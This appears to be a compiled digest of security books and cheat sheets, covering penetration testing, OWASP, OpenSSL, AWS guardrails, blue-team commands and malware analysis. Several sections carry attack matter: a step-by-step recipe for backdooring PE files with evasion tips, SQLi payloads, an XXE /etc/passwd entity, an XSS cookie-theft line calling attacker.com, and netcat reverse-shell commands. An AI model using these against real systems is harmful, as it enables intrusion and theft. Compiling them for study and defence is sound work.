# KILLER QUEEN - BOOK KNOWLEDGE EXHAUSTIVE EXTRACTION
## All Techniques, Commands, Tools, and Methodology from 26 Books

---

# 1. BACKDOOR MANUFACTURING (448 lines)
**Source:** Security paper by Ege BALCI, Penetration Tester at Invictus Europe

## Techniques
- **PE Backdoor Manufacturing**: 4-step methodology for implanting backdoors in PE files
  1. Finding available space (Code Caves vs Adding New Section)
  2. Hijacking execution flow
  3. Injecting backdoor code
  4. Restoring execution flow

### Available Space Methods
- **Adding New Section**: Use LordPE or disassembler to add section header; set flags to Read/Write/Execute; add null bytes for section size
- **Code Caves**: Use Cminer tool (`./Cminer putty.exe 300`) to enumerate code caves > 300 bytes; use existing sections to avoid AV detection
- **Multiple Code Caves**: Split backdoor code across multiple caves for better evasion

### Execution Flow Hijacking
- **Hiding Under User Interaction**: Redirect execution inside functions requiring user interaction (bypasses sandbox analysis)
- Patch instruction to JMP to code cave address (5-6 byte long jump)
- Use IDA Pro: Views->Open Subviews->Strings; Ctrl+X for cross-references
- Note the next instruction address for return

### Backdoor Injection
- Save registers with PUSHAD/PUSHFD before backdoor code
- Use meterpreter reverse TCP shellcode from Metasploit
- Modify shellcode to retry connection instead of calling ExitProcess
- Compile: `nasm -f bin stager_reverse_tcp_nx.asm`
- Create thread shellcode using CreateThread API
- Encode shellcode with custom encoders (Metasploit encoders are signatured)
- Test on VirusTotal in raw format
- Insert via Immunity Debugger: Ctrl+E, paste hex (watch byte limit)
- Convert shellcode to hex: `xxd -ps createthread`

### Restoring Execution Flow
- POPFD/POPAD to restore registers
- Execute the hijacked instruction
- JMP back to the original function address
- Copy to executable, save, fix checksum

## Countermeasures
- Section privilege controls (data sections shouldn't have execute; code sections shouldn't have write)
- Uncommon section recognition (entropy analysis)
- SHA1 signature checks
- File checksum verification

## Tools Referenced
- IDA Pro, LordPE, Cminer, Immunity Debugger, Metasploit, NASM, VirusTotal, xxd

---

# 2. NMAP CHEAT SHEET (422 lines)
**Source:** stationx.net

## Scan Techniques
- `-sS`: TCP SYN scan (default)
- `-sT`: TCP connect scan (default without root)
- `-sU`: UDP port scan
- `-sA`: TCP ACK port scan
- `-sW`: TCP Window port scan
- `-sM`: TCP Maimon port scan

## Host Discovery
- `-sL`: List targets only (no scan)
- `-sn`: Disable port scanning (ping sweep)
- `-Pn`: Disable host discovery (port scan only)
- `-PS`: TCP SYN discovery on port x
- `-PA`: TCP ACK discovery on port x
- `-PU`: UDP discovery on port x
- `-PR`: ARP discovery on local network
- `-n`: Never do DNS resolution

## Port Specification
- `-p 21`: Single port; `-p 21-100`: Range; `-p U:53,T:21-25,80`: Mixed
- `-p-65535` or `-p0-`: All ports; `-F`: Fast (100 ports); `--top-ports 2000`: Top ports

## Service/OS Detection
- `-sV`: Version detection; `--version-intensity 0-9`; `--version-light`; `--version-all`
- `-O`: OS detection; `--osscan-guess`; `--osscan-limit`
- `-A`: OS detection + version detection + script scanning + traceroute

## Timing (-T0 to -T5)
- T0: Paranoid (IDS evasion); T1: Sneaky; T2: Polite; T3: Normal (default); T4: Aggressive; T5: Insane
- `--host-timeout`, `--min-rtt-timeout/max-rtt-timeout`, `--scan-delay`, `--max-retries`, `--min-rate`, `--max-rate`

## NSE Scripts
- `-sC` or `--script default`: Default safe scripts
- `--script=banner`, `--script=http*`, `--script "not intrusive"`
- `--script-args snmpcommunity=admin`
- `http-sitemap-generator`, `dns-brute`, `smb-enum*`, `whois*`, `http-sql-injection`

## Firewall/IDS Evasion
- `-f`: Fragment packets; `--mtu 32`: Custom offset
- `-D decoy1,decoy2,...`: Decoy scan
- `-S`: Spoof source IP; `-g`: Source port; `--proxies`: HTTP/SOCKS4 proxy relay
- `--data-length 200`: Append random data
- Example: `nmap -f -t 0 -n -Pn --data-length 200 -D decoy1,decoy2,... target`

## Output
- `-oN`: Normal; `-oX`: XML; `-oG`: Grepable; `-oA`: All three; `--open`: Only open ports
- `--packet-trace`, `--reason`, `--resume`
- `ndiff scan1.xml scan2.xml`: Compare scans
- `xsltproc nmap.xml -o nmap.html`: Convert XML to HTML

---

# 3. BURP SUITE QUICK AND DIRTY TUTORIAL (285 lines)

## BurpSuite Editions
- Community (free, bundled with Kali Linux), Professional (paid), Enterprise

## Setup
- Configure FoxyProxy add-on in Firefox: forward to 127.0.0.1:8080
- Burp Proxy: 127.0.0.1:8080
- Enable "Intercept responses based on rules" and "Unhide hidden form fields"
- Add target URL to scope; filter for "Show only in-scope items"

## Key Features
- **Spider/Crawler**: Configure crawl limits, URL path filename/folders, URL to body mapping
- **Scanner/Audit**: Select scan templates or create custom; Dashboard for real-time monitoring
- **Intruder**: Automated attacks (SQLi fuzzing with payload lists like FuzzDB xplatform.txt)
  - Clear positions, mark injection points, load payloads, uncheck URL-encoding for special chars
- **Repeater**: Resend and modify individual requests
- **Decoder**: Encode/decode URLs, ASCII, Octal, Binary, Hex, HTML, Base64

## Attack Example (SQLi)
- Load FuzzDB xplatform.txt payloads
- Successful payloads: `anything' OR 'x'='x`, `a' or 1=1--`, `' or 1=1 /*`, `' or username like char(37);`

---

# 4. JAVASCRIPT CHEAT SHEET (718 lines)

## Core Concepts
- var, const, let - variable declarations
- Data types: Numbers, Strings, Objects, Arrays, Booleans
- Array methods: concat(), indexOf(), join(), pop(), push(), reverse(), shift(), slice(), sort(), splice(), toString(), unshift()

## Key Functions
- alert(), confirm(), console.log(), document.write(), prompt()
- Global: decodeURI(), encodeURI(), eval(), isFinite(), isNaN(), Number(), parseFloat(), parseInt()

## Regex
- Pattern modifiers: e, i, g, m, s, x, U
- Metacharacters: ., \w, \W, \d, \D, \s, \S, \b, \B
- Quantifiers: n+, n*, n?, n{X}, n{X,Y}, n$, ^n

## DOM
- Node methods: appendChild(), cloneNode(), insertBefore(), removeChild(), replaceChild()
- Element methods: getAttribute(), setAttribute(), getElementsByTagName(), hasAttribute()

## Events
- Mouse: onclick, ondblclick, onmousedown, onmouseup, onmouseenter
- Keyboard: onkeydown, onkeypress, onkeyup
- Form: onblur, onchange, onfocus, onsubmit
- Error handling: try, catch, throw, finally

---

# 5. IMMUTABLE SECURITY CONTROLS (809 lines)
**AWS-focused Guardrails / Service Control Policies (SCPs)**

## Account GuardRails
- Region Restriction: Deny all outside specified regions (except global services: iam, organizations, route53, budgets, waf, cloudfront, globalaccelerator)
- Allow only required services (whitelist approach)
- Prevent modifying Account & Billing settings (aws-portal:ModifyAccount, ModifyBilling, ModifyPaymentMethods)
- Restrict Root User: Deny all for arn:aws:iam::*:root
- Deny Creation of IAM Users/Access Keys: iam:CreateAccessKey, iam:CreateUser
- Prevent modification of specific IAM Role
- Prevent disabling IAM Access Analyzer
- Prevent creating/deleting resource shares (ram:AssociateResourceShare, CreateResourceShare, DeleteResourceShare)
- Prevent leaving AWS Organizations

## Security Baseline Protection
- Prevent deleting/stopping CloudTrail: cloudtrail:StopLogging, cloudtrail:DeleteTrail
- Prevent disabling AWS Config: config:DeleteConfigRule, DeleteConfigurationRecorder, DeleteDeliveryChannel, StopConfigurationRecorder
- Prevent disabling GuardDuty: guardduty:DeleteDetector, DeleteIPSet, DeleteThreatIntelSet, etc.
- Prevent disrupting CloudWatch: cloudwatch:DeleteAlarms, DeleteDashboards, DisableAlarmActions, etc.
- Prevent deleting VPC Flow logs: ec2:DeleteFlowLogs, logs:DeleteLogGroup, logs:DeleteLogStream
- Prevent VPC internet access: ec2:AttachInternetGateway, CreateInternetGateway, etc.
- Prevent disabling Security Hub
- Prevent disabling Macie

## Data GuardRails
- Allow only specific region S3 buckets
- Prevent deleting S3 buckets/objects
- Require SSE-S3 (AES256) encryption on all S3 PutObject
- Prevent modifying S3 Block Public Access
- Prevent deleting KMS keys: kms:ScheduleKeyDeletion, kms:Delete*

## EC2 Instance Control
- Specify allowed instance types (e.g., t2.micro only)
- Require IMDSv2: ec2:MetadataHttpTokens = required
- Deny instance metadata service modification
- Require MFA for StopInstances/TerminateInstances
- Require EC2 encryption

---

# 6. OPENSSL COOKBOOK (2665 lines)
**By Ivan Ristić (Feisty Duck)**

## Version & Build
- `openssl version -a`: Full version info with OPENSSLDIR
- Build: `./config --prefix=/opt/openssl --openssldir=/opt/openssl && make && sudo make install`
- 46 utilities in OpenSSL

## Trust Store
- Mozilla's certdata.txt: https://mxr.mozilla.org/mozilla/source/security/nss/lib/ckfw/builtins/certdata.txt
- Curl PEM conversion: http://curl.haxx.se/docs/caextract.html
- Perl script: mk-ca-bundle.pl; Go tool: convert_mozilla_certdata.go

## Key Generation
- RSA: `openssl genrsa -aes128 -out fd.key 2048` (recommend AES-128/192/256, 2048-bit)
- Public key extraction: `openssl rsa -in fd.key -pubout -out fd-public.key`
- DSA: `openssl dsaparam -genkey 2048 | openssl dsa -out dsa.key -aes128`
- ECDSA: `openssl ecparam -genkey -name secp256r1 | openssl ec -out ec.key -aes128`
- Supported curves for web: secp256r1 (prime256v1) and secp384r1
- Public exponent: 65537 (0x10001) is standard; avoid 3

## CSR Creation
- `openssl req -new -key fd.key -out fd.csr`
- Unattended: `openssl req -new -config fd.cnf -key fd.key -out fd.csr`
- CSR from existing cert: `openssl x509 -x509toreq -in fd.crt -out fd.csr -signkey fd.key`

## Certificate Management
- Self-signed: `openssl x509 -req -days 365 -in fd.csr -signkey fd.key -out fd.crt`
- One-step: `openssl req -new -x509 -days 365 -key fd.key -out fd.crt`
- Multi-hostname (SAN): subjectAltName in fd.ext file: `subjectAltName = DNS:*.feistyduck.com, DNS:feistyduck.com`
- Sign with SAN: `openssl x509 -req -days 365 -in fd.csr -signkey fd.key -out fd.crt -extfile fd.ext`
- Examine: `openssl x509 -text -in fd.crt -noout`

## Certificate Extensions Explained
- Basic Constraints: CA:FALSE/TRUE
- Key Usage: Digital Signature, Key Encipherment
- Extended Key Usage: TLS Web Server Authentication, TLS Web Client Authentication
- CRL Distribution Points
- Certificate Policies (EV indicators via OID)
- Authority Information Access (OCSP responder, CA Issuers)
- Subject Key Identifier / Authority Key Identifier
- Subject Alternative Name (SAN)

## Key/Certificate Conversion
- PEM to DER: `openssl x509 -inform PEM -in fd.pem -outform DER -out fd.der`
- DER to PEM: `openssl x509 -inform DER -in fd.der -outform PEM -out fd.pem`
- PKCS#12 export: `openssl pkcs12 -export -out fd.p12 -inkey fd.key -in fd.crt -certfile fd-chain.crt`
- PKCS#12 import: `openssl pkcs12 -in fd.p12 -out fd.pem -nodes`
- Split PKCS#12 components: `-nocerts` for key, `-nokeys -clcerts` for cert, `-nokeys -cacerts` for chain
- PEM to PKCS#7: `openssl crl2pkcs7 -nocrl -out fd.p7b -certfile fd.crt -certfile fd-chain.crt`
- PKCS#7 to PEM: `openssl pkcs7 -in fd.p7b -print_certs -out fd.pem`

## Cipher Suite Configuration
- List all suites: `openssl ciphers -v 'ALL:COMPLEMENTOFALL'`
- List by type: `openssl ciphers -v 'RC4'`
- Use `-V` for suite IDs (extra-verbose)
- Keywords: DEFAULT, ALL, HIGH, MEDIUM, LOW, EXP/EXPORT
- Digest keywords: MD5, SHA/SHA1, SHA256, SHA384
- Authentication: aRSA, aDSS, aECDSA, aNULL, PSK, SRP
- Key exchange: kRSA, DH, EDH, ECDH, EECDH, ADH
- Cipher keywords: AES, AES128, AES256, CAMELLIA, DES, 3DES, RC4, SEED

## SSL/TLS Deployment Best Practices
- Use 2048-bit private keys; protect private keys
- Deploy complete certificate chains
- Use only secure protocols (TLS 1.2+); only secure cipher suites
- Support Forward Secrecy (ECDHE/DHE)
- Disable client-initiated renegotiation
- Encrypt 100% of website; avoid mixed content
- Secure cookies; deploy HSTS; disable caching of sensitive content

## Performance
- Don't use too-strong keys (2048-bit is sufficient)
- Session resumption, persistent connections, caching

---

# 7. OWASP TOP 10 - 2017 (2845 lines)

## A1:2017 - Injection
- SQL, NoSQL, OS, LDAP injection via untrusted data to interpreters
- Prevention: Safe APIs (parameterized queries), ORMs, whitelist input validation, LIMIT controls
- Stored procedures can still be vulnerable via EXECUTE IMMEDIATE
- Example: `String query = "SELECT * FROM accounts WHERE custID='" + request.getParameter("id") + "'";`

## A2:2017 - Broken Authentication
- Credential stuffing, brute force, default passwords
- Prevention: MFA, no default credentials, weak-password checks, NIST 800-63 alignment
- Session IDs not in URL, rotate after login, invalidate on logout
- Limit failed login attempts; log all failures

## A3:2017 - Sensitive Data Exposure
- Clear text transmission (HTTP, SMTP, FTP), weak crypto
- Prevention: Classify data, encrypt at rest, TLS with PFS, HSTS
- Password storage: Argon2, scrypt, bcrypt, PBKDF2 (salted, adaptive hashing)

## A4:2017 - XML External Entities (XXE)
- External entities for file disclosure, SSRF, DoS
- Example: `<!ENTITY xxe SYSTEM "file:///etc/passwd" >]><foo>&xxe;</foo>`
- Prevention: Disable DTD/entity processing, use JSON, patch XML processors, SOAP 1.2+

## A5:2017 - Broken Access Control
- Bypass via URL modification, IDOR, privilege escalation, CORS misconfiguration
- Prevention: Deny by default, record ownership enforcement, JWT invalidation on server
- Disable directory listing, log access failures, rate limit APIs

## A6:2017 - Security Misconfiguration
- Default accounts, unnecessary features, verbose errors, outdated software
- Cloud storage permissions (S3 buckets)
- Prevention: Repeatable hardening process, minimal platform, segmented architecture, security headers

## A7:2017 - Cross-Site Scripting (XSS)
- Reflected, Stored, DOM XSS
- Prevention: Context-sensitive escaping, CSP, frameworks with auto-escaping (React, Rails)
- Example: `'><script>document.location='http://attacker.com/cgi-bin/cookie.cgi?foo='+document.cookie</script>'`

## A8:2017 - Insecure Deserialization
- Remote code execution, replay attacks, privilege escalation

## A9:2017 - Using Components with Known Vulnerabilities

## A10:2017 - Insufficient Logging & Monitoring
- Average breach detection: 200+ days, typically by external parties

---

# 8. HACK YOURSELF FIRST (3360 lines)
**By Stephen Haywood - Beginner's Guide to Penetration Testing**

## PTES Methodology
1. Intelligence Gathering
2. Threat Modeling
3. Vulnerability Analysis
4. Exploitation
5. Post Exploitation
6. Reporting

## Core Pentesting Areas
1. Social Engineering (phishing, spear phishing, pretexting)
2. Physical Testing (tailgating, lock picking)
3. Wireless Testing (WEP/WPA/WPA2/WPS cracking)
4. Web Application Testing (OWASP Top Ten)
5. Network Testing

## Social Engineering Tools
- **theHarvester**: `theharvester -d domain.com -b all -f output`
- **Maltego**: OSINT aggregation and visualization
- **Metagoofil**: `metagoofil -d domain -t doc -l 200 -n 50 -o /root/dir -f file.html`
- **Recon-ng**: Web reconnaissance framework (Python)
- **SET (Social Engineers Toolkit)**:
  - Credential Harvester: Menu 1,2,3 - clone site, harvest login credentials
  - Java Applet Attack: Signed applet for RCE
  - Infectious Media Attack: Metasploit payload + autorun.inf
  - QR Code Attack: Points to attack site
  - `setoolkit` to launch; site cloner captures all POSTs

## SMTP Verification
- Connect via Telnet to port 25; use EXPN or VRFY
- `telnet aspmx3.googlemail.com 25` → HELO → MAIL FROM → RCPT TO
- Valid: 250 OK; Invalid: 550

## OSINT Google Dorks
- `site:linkedin.com inurl:pub "at <org name>"`
- `site:facebook.com "<search terms>"`
- `site:twitter.com "<search terms>"`
- Other sources: pipl.com, jigsaw.com, namechk.com, gravatar.com

## Wireless Testing
- WEP: Capture IVs with Airodump-ng, replay ARPs with Aireplay-ng, crack with Aircrack-ng
- WPA/WPA2: Capture 4-way handshake, brute-force PSK
- WPS: Brute-force PIN (two halves: 4-digit + 3-digit with checksum)
- **Commands**:
  - `airmon-ng start wlan0 [channel]`
  - `airodump-ng -c [ch] --bssid [BSSID] -w [file] mon0`
  - `aireplay-ng -3 -b [BSSID] -h [MAC] mon0`
  - `aircrack-ng -b [BSSID] [pcap file]`
  - `airmon-ng stop mon0`

## Web Application Testing
- Burp Suite: Intercepting proxy, Spider, Intruder, Repeater
- DVWA, Mutillidae, Metasploitable2 for practice

## Tools Referenced
- Kali Linux, Metasploit, Nmap, Nessus, SET, theHarvester, Maltego, Metagoofil, Recon-ng, Aircrack-ng suite

---

# 9. OWASP ASVS 3.0 (4589 lines)

## Verification Levels
- **Level 1 (Opportunistic)**: Defends against OWASP Top 10; suitable for low-value apps; can be automated
- **Level 2 (Standard)**: Sensitive data, B2B transactions, healthcare
- **Level 3 (Advanced)**: Critical apps (military, health/safety, critical infrastructure)

## Verification Requirements (V1-V19)
- V1: Architecture, design and threat modelling (STRIDE)
- V2: Authentication (password policies, MFA, credential recovery)
- V3: Session management (secure session IDs, logout, timeouts)
- V4: Access control (deny by default, record ownership)
- V5: Malicious input handling (input validation, parameterized queries)
- V6: Output encoding/escaping (XSS prevention)
- V7: Cryptography at rest
- V8: Error handling and logging
- V9: Data protection
- V10: Communications security (TLS, certificate validation)
- V11: HTTP security configuration (security headers)
- V12: Security configuration
- V13: Malicious controls (code integrity, anti-malware)
- V14: Internal security (separation of duties)
- V15: Business logic
- V16: Files and resources
- V17: Mobile verification
- V18: Web services (REST, SOAP)
- V19: Configuration

## Industry-Specific Guidance
- Finance/Insurance: L2 for sensitive data; L3 for wire transfers
- Manufacturing/Defense: L3 for IP/trade secrets
- Healthcare: L3 for medical equipment/records; HIPAA
- Retail/Hospitality: L2 for payment data; L3 for POS systems

## Tools Using ASVS
- OWASP Security Knowledge Framework (SKF)
- OWASP ZAP (Zed Attack Proxy)
- OWASP Cornucopia (card game for threat modeling)

---

# 10. BLUE TEAM FIELD MANUAL (BTFM) (4883 lines)
**NIST Cybersecurity Framework based: Identify, Protect, Detect, Respond, Recover**

## IDENTIFY (Scope)

### NMAP Commands
```bash
nmap -sn -PE <IP RANGE>                    # Ping sweep
nmap --open <IP RANGE>                     # Show open ports
nmap -sV <IP>                              # Service version
nmap -p 80,443 <IP RANGE>                  # Specific ports
nmap -sU -p 53 <IP RANGE>                  # UDP DNS scan
nmap -v -Pn -SU -ST -p U:53,111,137,T:21-25,80,139,8080 <IP>
```

### Nessus
```bash
nessus -q -x -T html <server> <port> <user> <pass> <targets.txt> <results.html>
```

### OpenVAS
```bash
apt-get install openvas-server openvas-client openvas-plugins-base openvas-plugins-dfsg
openvas-nvt-sync
openvas-adduser
openvas-client -q 127.0.0.1 9390 sysadm nsrc+ws scanme.txt output.html -T html -V -x
```

### Windows Discovery
```cmd
net view /all
for /L %I in (1,1,254) do ping -w 30 -n 1 192.168.1.%I | find "Reply" >> output.txt
nbtstat -A <IP>
for /L %I in (1,1,254) do nbstat -An 192.168.1.%I
psloggedon \\computername
```

### Windows DNS/DHCP/Hashing
```cmd
reg add HKLM\System\CurrentControlSet\Services\DhcpServer\Parameters /v ActivityLogFlag /t REG_DWORD /d 1
DNSCmd <server> /config /logLevel 0x8100F331
fciv.exe <file>                    # File Checksum Integrity Verifier
Get-FileHash <file> | Format-List  # PowerShell
certutil -hashfile <file> SHA1
certutil -hashfile <file> MD5
```

### Active Directory
```cmd
dsquery ou DC=<DOMAIN>,DC=<EXT>
netdom query WORKSTATION / SERVER / DC / PDC / TRUST / FSMO
dsquery COMPUTER "OU=servers,DC=<DOMAIN>,DC=<EXT>" -o rdn -limit 0
dsquery user domainroot -inactive 3
dsquery * -filter "(whenCreated>=20101022083730.0Z)"
adfind -csv -b dc=<DOMAIN>,dc=<EXT> -f "(&(objectCategory=Person)(objectClass=User)(whenCreated>=20151001000000.0Z))"
Get-ADUser -Filter * -Properties whenCreated | Where-Object {$_.whenCreated -ge ((Get-Date).AddDays(-90)).Date}
```

### Linux Discovery
```bash
smbtree -b / -D / -S
smbclient -L <HOST>
for ip in $(seq 1 254); do ping -c 1 192.168.1.$ip>/dev/null; [ $? -eq 0 ] && echo "192.168.1.$ip UP"; done
cat /var/lib/dhcpd/dhcpd.leases
rndc querylog
tail -f /var/log/messages | grep named
find /<PATH> -type f -exec md5sum {} >> md5sums.txt \;
md5deep -rs / > md5sums.txt
nbtscan <IP RANGE>
```

## PROTECT (Defend)

### Windows Firewall
```cmd
netsh advfirewall firewall show rule name=all
netsh advfirewall set currentprofile state on
netsh advfirewall set currentprofile firewallpolicy blockinboundalways,allowoutbound
netsh advfirewall firewall add rule name="Open Port 80" dir=in action=allow protocol=TCP localport=80
netsh advfirewall firewall add rule name="My App" dir=in action=allow program="C:\MyApp\MyApp.exe" enable=yes remoteip=157.60.0.1,172.16.0.0/16,LocalSubnet profile=domain
netsh advfirewall set currentprofile logging C:\<LOCATION>\<FILE>
```

### Windows Passwords
```cmd
net user <USER> * /domain
pspasswd.exe \\<IP> -u <REMOTE USER> -p <NEW PASSWORD>
```

### Host File / Whitelist
```cmd
ipconfig /flushdns
nbtstat -R
echo 127.0.0.1 <MALICIOUS DOMAIN> >> C:\Windows\System32\drivers\etc\hosts
```
- PAC file for URL/IP blacklisting

### AppLocker
```powershell
import-module Applocker
Get-ApplockerFileInformation -Directory C:\Windows\System32\ -Recurse -FileType Exe, Script
Get-ChildItem C:\Windows\System32\*.exe | Get-ApplockerFileInformation | New-ApplockerPolicy -RuleType Publisher, Hash -User Everyone -RuleNamePrefix System32
Set-AppLockerPolicy -XMLPolicy C:\Policy.xml
Test-AppLockerPolicy -XMLPolicy C:\Policy.xml -Path C:\Windows\System32\calc.exe,C:\Windows\System32\notepad.exe -User Everyone
Get-AppLockerPolicy -Local | Test-AppLockerPolicy -Path C:\Windows\System32\*.exe -User domain\<USER> -Filter Denied | Format-List -Property Path
```

### IPSec
```cmd
netsh ipsec static add filter filterlist=MyIPsecFilter srcaddr=Any dstaddr=Any protocol=ANY
netsh ipsec static add filteraction name=MyIPsecAction action=negotiate
netsh ipsec static add policy name=MyIPsecPolicy assign=yes
netsh ipsec static add rule name=MyIPsecRule policy=MyIPsecPolicy filterlist=MyIPsecFilter filteraction=MyIPsecAction conntype=all activate=yes psk=<PASSWORD>
```

### GPO
```cmd
gpupdate /force
auditpol /set /user:bob /category:"Detailed Tracking" /include /success:enable /failure:enable
dsadd OU <QUARANTINE BAD OU>
dsmove "CN=<USER>,OU=<OLD>,DC=<DOMAIN>,DC=<EXT>" -newparent OU=<NEW>,DC=<DOMAIN>,DC=<EXT>
Move-ADObject 'CN=<USER>,CN=<OLD>,DC=<DOMAIN>,DC=<EXT>' -TargetPath 'OU=<NEW>,DC=<DOMAIN>,DC=<EXT>'
```

### Standalone System
```cmd
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v DisallowRun /t REG_DWORD /d "00000001" /f
```

## DETECT (Visibility)

### tcpdump
```bash
tcpdump -i eth0 -nn -s0 -v
tcpdump -i eth0 -w capture.pcap
tcpdump -r capture.pcap -nn
tcpdump -i eth0 -c 1000 -w capture.pcap
tcpdump -i eth0 host 192.168.1.1
tcpdump -i eth0 src 192.168.1.1
tcpdump -i eth0 dst 192.168.1.1
tcpdump -i eth0 port 80
tcpdump -i eth0 src port 80
tcpdump -i eth0 dst port 80
tcpdump -i eth0 net 192.168.1.0/24
tcpdump -i eth0 tcp
tcpdump -i eth0 udp
```

### tshark
```bash
tshark -r capture.pcap
tshark -r capture.pcap -Y "http"
tshark -r capture.pcap -T fields -e ip.src -e ip.dst
```

### Snort Rules
```
alert tcp any any -> any any (msg:"Example"; content:"badstuff"; sid:1000001;)
```

### Network Capture Tools
- editcap: Split/edit pcap files
- mergecap: Merge multiple pcap files

### Honey Techniques
- Windows: Honeyports, Honeyfiles
- Linux: honeyd, Artillery, Cowrie

### Netcat
```bash
nc -l -p [port]                           # Listener
nc -v -n -z -w1 [IP] [start]-[end]        # Port scanner
nc -l -p [port] -e /bin/bash              # Backdoor shell
nc [LocalIP] [port] -e /bin/bash          # Reverse shell
```

### Log Auditing - Windows
```cmd
wevtutil el                                  # List event logs
wevtutil qe Security /c:5 /rd:true /f:text   # Query events
Get-EventLog -LogName Security -Newest 10
Get-WinEvent -FilterHashtable @{LogName='Security'; ID=4624}
```

### Log Auditing - Linux
```bash
cat /var/log/auth.log | grep "Failed password"
cat /var/log/syslog
journalctl -xe
ausearch -m USER_LOGIN --success no
```

## RESPOND (Analysis)

### Live Triage - Windows
```cmd
systeminfo
tasklist /v
tasklist /svc
netstat -ano
net user
net localgroup administrators
sc query
wmic qfe list brief
wmic startup list brief
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Run
dir /a "C:\Users"
dir /a /s /b C:\*.exe
```

### Live Triage - Linux
```bash
uname -a
ps aux
netstat -antup
cat /etc/passwd
cat /etc/shadow
last
history
ls -la /etc/cron*
find / -perm -4000 -o -perm -2000
```

### Malware Analysis - Static
- File identification: file command, PEiD, TrID
- Strings: strings, BinText, FLOSS
- Hashing: md5sum, sha256sum, ssdeep (fuzzy hashing)
- PE Analysis: PEview, PE Explorer, Resource Hacker

### Malware Analysis - Dynamic
- Process Monitor (procmon), Process Explorer (procexp)
- Regshot (registry comparison)
- ApateDNS (fake DNS), Netcat (fake services), INetSim (fake internet)
- Wireshark (packet capture)

### Hash Query
- VirusTotal API, Team Cymru Malware Hash Registry

### Memory Acquisition
- Windows: FTK Imager, WinPmem, DumpIt, Belkasoft RAM Capturer
- Linux: LiME (Linux Memory Extractor), fmem

## RECOVER (Remediate)

### Patching
```cmd
wmic qfe list brief
wusa <patch>.msu /quiet /norestart
Get-HotFix
```
```bash
apt-get update && apt-get upgrade
yum update
```

### Backups
```cmd
wbadmin start backup -backupTarget:E: -include:C:
wbadmin start systemstatebackup -backupTarget:E:
```
```bash
tar -czf backup.tar.gz /path/to/backup
rsync -avz /source/ user@remote:/dest/
```

### Kill Malware Process
```cmd
taskkill /PID <PID> /F
wmic process where name="malware.exe" delete
```
```bash
kill -9 <PID>
pkill -f malware
```

---

# 11. CIS CONTROLS V7.1 (5337 lines)

## Implementation Groups
- **IG1 (Cyber Hygiene)**: Small orgs, limited IT expertise, non-targeted attacks
- **IG2**: Moderate orgs with IT staff, sensitive data
- **IG3**: Large orgs with security experts, targeted/zero-day attacks

## 20 Critical Controls
### Basic (1-6)
1. Inventory and Control of Hardware Assets
2. Inventory and Control of Software Assets
3. Continuous Vulnerability Management
4. Controlled Use of Administrative Privileges
5. Secure Configuration for Hardware and Software
6. Maintenance, Monitoring and Analysis of Audit Logs

### Foundational (7-16)
7. Email and Web Browser Protections
8. Malware Defenses
9. Limitation and Control of Network Ports, Protocols and Services
10. Data Recovery Capabilities
11. Secure Configuration for Network Devices
12. Boundary Defense
13. Data Protection
14. Controlled Access Based on Need to Know
15. Wireless Access Control
16. Account Monitoring and Control

### Organizational (17-20)
17. Security Awareness and Training
18. Application Software Security
19. Incident Response and Management
20. Penetration Tests and Red Team Exercises

## Five Critical Tenets
1. Offense informs defense
2. Prioritization
3. Measurements and Metrics
4. Continuous diagnostics and mitigation
5. Automation

---

# 12. CISSP 8TH EDITION (55357 lines)
**8 Domains: Security & Risk Management, Asset Security, Security Architecture & Engineering, Communication & Network Security, IAM, Security Assessment & Testing, Security Operations, Software Development Security**

## Cryptography (Chapter 6-7) - Key Extracts

### Symmetric Algorithms
| Algorithm | Block Size | Key Size |
|-----------|-----------|----------|
| AES (Rijndael) | 128 | 128, 192, 256 |
| DES | 64 | 56 |
| 3DES | 64 | 112 or 168 |
| Blowfish | 64 | 32-448 |
| IDEA | 64 | 128 |
| RC2 | 64 | 128 |
| RC5 | 32,64,128 | 0-2040 |
| Skipjack | 64 | 80 |
| Twofish | 128 | 1-256 |

### AES Details
- FIPS 197 mandated for U.S. government
- 128-bit key: 10 rounds; 192-bit: 12 rounds; 256-bit: 14 rounds
- Twofish: prewhitening + 16 rounds + postwhitening

### DES Modes
- ECB (Electronic Code Book) - least secure
- CBC (Cipher Block Chaining)
- CFB (Cipher Feedback)
- OFB (Output Feedback) - errors don't propagate
- CTR (Counter)

### Key Management
- Offline distribution, public key encryption, Diffie-Hellman
- Diffie-Hellman: agree on p (prime) and g; each picks random r/s; exchange R=g^r mod p, S=g^s mod p; compute K=S^r mod p = R^s mod p
- Never store key on same system as encrypted data
- Split knowledge: two individuals each have half the key
- Fair Cryptosystem: key split among independent third parties
- Escrowed Encryption Standard: basis for Skipjack

### Cryptographic Lifecycle
- Algorithm governance: specify acceptable algorithms, key lengths, protocols
- Moore's Law: processing power doubles every ~2 years

---

# 13. PRACTICAL MALWARE ANALYSIS (49507 lines)
**By Michael Sikorski and Andrew Honig (No Starch Press)**

## Malware Analysis Techniques
1. Basic Static Analysis: AV scanning, hashing, strings, PE headers
2. Basic Dynamic Analysis: Sandboxes, Process Monitor, Process Explorer, Regshot, network simulation
3. Advanced Static Analysis: IDA Pro, x86 disassembly, code constructs
4. Advanced Dynamic Analysis: OllyDbg, WinDbg kernel debugging

## Basic Static Analysis Tools
- **PEiD**: Detects packers
- **Dependency Walker**: Shows dynamically linked functions
- **PEview**: Examines PE headers and sections
- **Resource Hacker**: Views resource sections
- Strings, hashing (md5sum)

## Basic Dynamic Analysis Tools
- **Process Monitor (procmon)**: File system, registry, process/thread activity
- **Process Explorer (procexp)**: Process listing, DLLs, handles, Verify option
- **Regshot**: Registry snapshot comparison
- **ApateDNS**: Fake DNS responses
- **Netcat**: Fake network services
- **Wireshark**: Packet capture
- **INetSim**: Full internet simulation

## Malware Behavior Patterns (Ch 11-14)

### Downloaders and Launchers
- URLDownloadToFile + WinExec / ShellExecute

### Backdoors
- Reverse shell: cmd.exe with socket redirection via CreateProcess
- RATs (Remote Access Trojans): full-featured (file management, screen capture, keylogging)
- Botnets: centralized C2 via IRC or HTTP

### Credential Stealers
- GINA Interception: DLL installation for Windows credential capture
- Hash Dumping: Pwdump, cachedump, fgdump, Mimikatz techniques
- Keystroke Logging: SetWindowsHookEx, GetAsyncKeyState, GetForegroundWindow

### Persistence Mechanisms
- Registry: HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run, RunOnce, etc.
- Trojanized System Binaries: Replace legitimate executables
- DLL Load-Order Hijacking: Place malicious DLL in search path
- Services: CreateService, StartService

### Privilege Escalation
- SeDebugPrivilege: OpenProcess, AdjustTokenPrivileges
